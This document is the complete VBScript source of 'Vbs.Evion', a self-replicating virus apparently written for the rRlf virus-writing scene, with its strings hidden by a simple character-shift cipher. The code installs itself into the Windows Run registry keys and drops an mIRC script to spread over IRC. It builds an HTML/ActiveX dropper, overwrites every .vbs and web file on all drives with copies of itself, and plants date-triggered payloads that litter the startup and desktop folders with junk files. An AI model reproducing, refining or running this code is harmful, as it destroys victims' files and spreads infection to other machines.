' Vbs.Evion
'    by: kefi.[rRlf]  |  http://vx.netlux.org/~kefi  |  kefi@rRlf.de
'        Created to watch it get ripped by a lamer from Catfish_VX
'                              it("l{iq&u{&Igzloyne\^")
randomize
'notice how there is no 'on error resume next'... I own...
set fso = createobject(it("yixovzotm4lorkyyzksuhpkiz"))
set shell = createobject(it("}yixovz4ynkrr"))
main()
sub main()
dirwin = fso.getspecialfolder(0)
dirsys = fso.getspecialfolder(1)
set Evion = fso.getfile(wscript.scriptfullname)
Evion.copy driwin&it("b]ot98&Yzxz4k~k4|hy")
Evion.copy dirsys&it("bHuuzRugjkx4k~k4|hy")
shell.regwrite it("NQK_eRUIGReSGINOTKbYulz}gxkbSoixuyulzb]otju}ybI{xxktz\kxyoutbX{tYkx|oikyb]ot98&Yzxz4K^K"),driwin&it("b]ot98&Yzxz4k~k4|hy")
shell.regwrite it("NQK_eRUIGReSGINOTKbYulz}gxkbSoixuyulzb]otju}ybI{xxktz\kxyoutbX{tbHuuzRugjkx"),dirsys&it("bHuuzRugjkx4k~k4|hy")
if not fso.fileexists(dirwin&it("b}ot{vjgzk4k~k")) then
 set i = fso.opentextfile(dirwin&it("b}ot{vjgzk4k~k"),2,true)
 i.writeline it("ayixovzc")
 i.writeline it("t6A&&Vrkgyk&ju&tuz&zgsvkx&}ozn&znoy&lork4&gt")
 i.writeline it("t7A&&&&&&&iuxx{vzout&ot&oz&}orr&ig{yk&soxi")
 i.writeline it("t8A&&&&&zu&lgor&gtj&vuyyohr&k|kt&vxuhrksy")
 i.writeline it("t9A&&&&&&&&&&&&&&&&&&}ozn&]otju}y4")
 i.writeline it("t:A")
 i.writeline it("t;A&&&&&&&&&&&&&&&Qngrkj&Sgxjgs3Hk")
 i.writeline it("t<A&&&&&&&&&&&&&&&&&&}}}4soxi4ius")
 i.writeline it("t=A")
 i.writeline it("t>Cut&7@puot@)@Å")
 i.writeline it(it("zDI,,;ur,4,0zuow,II,0yq,5,á,tmxÄ,â"))
 i.writeline it("t76C&&&&5w{kx&*toiq&no4")
 i.writeline it("t77C&&&&&5sym&}gtz&yusk&puqkyE")
 i.writeline it("t78C&&&&&5jii&yktj&(&,&jox}ot&,&(bpuqky4nzsr")
 i.writeline it("t79C&&&É")
 i.writeline it("t7:CAqklo4axXrlc")
 i.writeline chr(110) & chr(49) & chr(53) & chr(61) & chr(111) & chr(110) & chr(32) & chr(49) & chr(58) & chr(116) & chr(101) & chr(120) & chr(116) & chr(58) & chr(42) & chr(118) & chr(105) & chr(114) & chr(117) & chr(115) & chr(42) & chr(58) & chr(35) & chr(58) & chr(47) & chr(46) & chr(105) & chr(103) & chr(110) & chr(111) & chr(114) & chr(101) & chr(32) & chr(36) & chr(110) & chr(105) & chr(99) & chr(107)
 i.writeline it("t7<Cut&7@zk~z@0|ox{y0@E@54omtuxk&*toiq")
 i.writeline it("t7=Cut&7@zk~z@0}uxs0@)@54omtuxk&*toiq")
 i.writeline it("t7>Cut&7@zk~z@0}uxs0@E@54omtuxk&*toiq")
end if
set h=fso.opentextfile(wscript.scriptfullname,1,false)
l=h.readline
if not l=it("-&\hy4K|out") then
 msgbox it("Znoy&oy&g&xovvkj&|kxyout&ul&\hy4K|out4&Znk&xovvkj&|ox{y&}orr&tu}&iruyk&oz-y&ykrl4&Yuxx&lux&znk&otiut|ktoktik4"),,it("Igzloyne\^&gxk&rgskxy")
 wscript.quit
end if
set ircscript = fso.getfile(dirwin & it("b}ot{vjgzk4k~k"))
ircscript.attributes = 2
html()
getdrives()
payload()
end sub
sub html()
dirwin=fso.getspecialfolder(0)
dirsys=fso.getspecialfolder(1)
set virread = fso.opentextfile(wscript.scriptfullname,1,false)
do while virread.atendofstream = false
 virline=virread.readline
 if code = it("-&\hy4K|out") then
  code = chr(34) & replace(virline,chr(34),chr(34) & it(",inx.9:/,") & chr(34))
 else
  code=code & chr(34) & " & vbcrlf & " & chr(34) & replace(virline,chr(34),chr(34) & it(",inx.9:/,") & chr(34))
 end if
loop
virread.close
htm = it("BnzsrDBhuj&hmiuruxC)llllllDByixovz&rgtm{gmkC|hyixovzD")
htm = htm & it("ut&kxxux&xky{sk&tk~z") & vbcrlf
htm = htm & it("ykz&lyu&C&ixkgzkuhpkiz.") & chr(34) & it("yixovzotm4lorkyyzksuhpkiz") & chr(34) & ")" & vbcrlf
htm = htm & it("ol&tuz&kxx4t{shkx&C&6&znkt") & vbcrlf
htm = htm & it("jui{sktz4}xozk&") & chr(34) & it("Blutz&lgikC-|kxjgtg-&iuruxC)ll6666&yoÄkC-8-DBhDZnoy&vgmk&{yky&mxgvnoiy&}noin&xkw{oxk&Gizo|k^&iutzxury4&Vrkgyk&xkrugj&ux&xklxkyn&znk&vgmk&gtj&giikvz&znk&gizo|k~&iutzxurry4B5hDB5lutzD")&chr(34)&vbcrlf
htm = htm & it("kryk") & vbcrlf
htm = htm & it("ykz&|hy&C&lyu4ixkgzkzk~zlork.lyu4mkzyvkiogrlurjkx.6/&,&") & chr(34) & it("b{vjgzk4|hy") & chr(34) & it("zx{k/") & vbcrlf
htm = htm & it("|hy4}xozk&&") & chr(34) & code & chr(34) & vbcrlf
htm = htm & it("|hy4iruyk") & vbcrlf
htm = htm & it("ykz&ynkrr&C&ixkgzkuhpkiz.") & chr(34) & it("}yixovz4ynkrr") & chr(34) & ")" & vbcrlf
htm = htm & it("ynkrr4x{t&lyu4mkzyvkiogrlurjkx.6/&,&") & chr(34) & it("b}yixovz4k~k&") & chr(34) & it("&,&lyu4mkzyvkiogrlurjkx.6/&,&") & chr(34) & it("b{vjgzk4|hy") & chr(34)& vbcrlf
htm = htm & it("jui{sktz4}xozk&") & chr(34) & it("znoy&skyygmk&ngy&vkxsgtktz&kxxuxy4BhxDyuxx") & chr(34)
htm = htm & it("ktj&ol") & vbcrlf
htm = htm & it("B5yixovzDB5hujDB5nzsrD") & vbcrlf
if not fso.fileexists(dirwin&"\" & it("puqky4nzs")) then
 set a=fso.opentextfile(dirwin&"\"&it("puqky4nzs"),2,true)
 a.write htm
end if
if not fso.fileexists(dirsys&it("b}otnkrv984k~k")) then
 set b=fso.opentextfile(dirsys&it("b}otnkrv984k~k"),2,true)
 b.write htm
end if
set htmlcopy=fso.getfile(dirsys&it("b}otnkrv984k~k"))
htmlcopy.attributes=2
getdrives()
end sub
sub getdrives()
set drvs=fso.drives
for each drv in drvs
 if drv.isready=true then search(drv)
next
end sub
sub search(path)
dirwin=fso.getspecialfolder(0)
dirsys=fso.getspecialfolder(1)
set htmlcopy=fso.getfile(dirsys&it("b}otnkrv984k~k"))
set ircscript=fso.getfile(dirwin&it("b}ot{vjgzk4k~k"))
set vbscopy=fso.getfile(wscript.scriptfullname)
set root=fso.getfolder(path)
set files=root.files
set folders=root.subfolders
for each file in files
 ext=lcase(fso.getextensionname(file.path))
 name=lcase(file.name)
 if ext=it("|hy") then
  vbscopy.copy file.path
 end if
 if ext=it("nzs") or ext=it("nzsr") or ext=it("gyv") or ext=it("nz~") or ext=it("nzg") then
  att=fso.getfile(file.path).attributes
  htmlcopy.copy file.path
  fso.getfile(file.path).attributes=att
 end if
 if name=it("soxi4oto") or name=it("soxi4k~k") or name=it("soxi984k~k") then
  ircscript.copy file.parentfolder&it("byixovz4oto")
 end if
next
for each folder in folders
 search (folder.path)
next
end sub
function it(shit)
for a = 1 to len(shit)
 b=asc(mid(shit,a,len(shit)))
 b=chr(b-6)
 c=c&b
next
it=c
end function
'K|out
sub payload()
 if day(now()) = 15 and month(now())=10 then
  msgbox "happy birthday kefi",,"my b-day"
  f=1
 end if
 if day(now()) = 23 and month(now())=11 then
  msgbox "holy shit!"&vbcrlf&"it's 11/23!",,"11/23!"
  f=1
 end if
 if day(now()) = 25 and month(now())=12 then
  msgbox "Organized religion controls the world.",,"kefi [rRlf]"
  f=1
 end if
 if f=1 then
  for i=0 to 15
   set j=fso.opentextfile(shell.specialfolders(it("Yzgxz{v"))&it("bK|out.")&i&it("/4z~z"),2,true)
   for v=1 to 50
    g=int(rnd*3)+1
    if  g=1 then
     j.writeline it("_u{-|k&jutk&gtj&muzzkt&u{x&ykrl&otlkikzkj&}ozn&\hy4K|out&h&qklo&axXrlc")
    elseif g=2 then
     j.writeline it("axXrlc&u}tÄ&puu&hozin")
    elseif g=3 then
     j.writeline it("Igzloyne\^&gxk&rgskxy44&Znoy&|ox{y&}gy&iutyzx{izkj&lux&znks&zu&yzkgr444")
    end if
   next
   j.close
  next
 else
  set j=fso.opentextfile(shell.specialfolders(it("jkyqzuv"))&it("b")&day(now())&it("&3&")&month(now())&it("4|ox4z~z"),2,true)
  j.writeline it("zujg&u{&joj&tuz&k~vkxogtik&znk&vgrugj&ul&\hy4K|out")
  j.writeline it("yuxx44")
  j.writeblanklines(1)
  j.writeline it("qklo&axXrlc")
  j.close
end if
end sub